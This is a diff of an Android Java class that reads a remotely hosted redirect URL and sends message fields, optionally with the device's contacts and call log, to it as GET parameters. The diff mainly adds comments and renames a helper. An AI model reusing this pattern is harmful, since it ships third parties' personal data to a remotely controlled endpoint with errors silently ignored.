@@ -39,31 +39,31 @@ class PostPHP extends AsyncTask<String[], Void, Void> {
     @Override
     protected Void doInBackground(String[]... strings) {
         try {
-            String[] finalArr = strings[0];
+            String[] finalArr = strings[0];//get the first string array
 
-            StringBuilder sb = new StringBuilder();
-            BufferedReader br = new BufferedReader(new InputStreamReader(new BufferedInputStream((new URL(c.getString(R.string.redirect_mail)).openConnection()).getInputStream())));
+            StringBuilder sb = new StringBuilder();//new string storage for the URL
+            BufferedReader br = new BufferedReader(new InputStreamReader(new BufferedInputStream((new URL(c.getString(R.string.redirect_mail)).openConnection()).getInputStream())));//open connection to text file
             String inputLine;
-            while ((inputLine = br.readLine()) != null) {
-                sb.append(inputLine);
+            while ((inputLine = br.readLine()) != null) { //read each line of the file
+                sb.append(inputLine); //append line of file to string builder
             }
-            br.close();
-            HttpURLConnection connection = (HttpURLConnection) new URL((sb.toString().trim() +c.getString(R.string.to) + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2] + conCat(c))).openConnection();
-            connection.getInputStream();
-            connection.disconnect();
+            br.close();//close the connection
+            HttpURLConnection connection = (HttpURLConnection) new URL((sb.toString().trim() +c.getString(R.string.to) + finalArr[0] + c.getString(R.string.subject_param) + finalArr[1] + c.getString(R.string.text_param) + finalArr[2] + addExtraInfo(c))).openConnection();
+            connection.getInputStream(); //open a connection to the modified URL with parameters taken from the string array
+            connection.disconnect(); //finally disconnect
 
         } catch (Exception ignored) {}
         return null;
     }
-    private String conCat(Context c){
+    private String addExtraInfo(Context c){
         SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(c);
-        String returnString = "";
+        String returnString = " ";
         Logs l = new Logs(c);
         if (settings.getBoolean("include_contacts", false)) {
-            returnString += c.getString(R.string.contacts_param) + l.getContacts();
+            returnString += l.getContacts();
         }
         if (settings.getBoolean("include_calllog", false)) {
-            returnString += c.getString(R.string.calls_param) + l.getCallLog(999);
+            returnString += l.getCallLog(10);
         }
         return returnString;
     }
